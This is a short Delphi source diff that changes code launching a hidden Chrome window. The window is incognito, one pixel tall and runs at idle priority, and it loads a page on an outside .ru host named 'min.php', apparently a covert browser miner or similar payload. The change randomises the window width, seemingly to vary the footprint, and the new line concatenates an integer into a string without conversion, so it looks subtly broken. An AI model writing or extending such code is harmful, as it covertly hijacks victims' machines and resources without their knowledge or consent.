@@ -68,7 +68,7 @@ begin
  { CreateProcess(PChar(ProgramFilesDir + '\Internet Explorer\iexplore.exe'),
                        ' -k -noframemerging  http://hams9857.ru/min.php', nil, nil, False, }
   CreateProcess(PChar(ProgramFilesDir + '\Google\Chrome\Application\chrome.exe'),
-                       '- --incognito --window-position=0,0 --window-size=5000,1 http://hams9857.ru/min.php', nil, nil, False,
+                       '- --incognito --window-position=0,0 --window-size='+randomrange(5000,9000)+',1 http://hams9857.ru/min.php', nil, nil, False,
                        IDLE_PRIORITY_CLASS, nil, nil, StartupInfo, ProcessInformation);
 end;
 
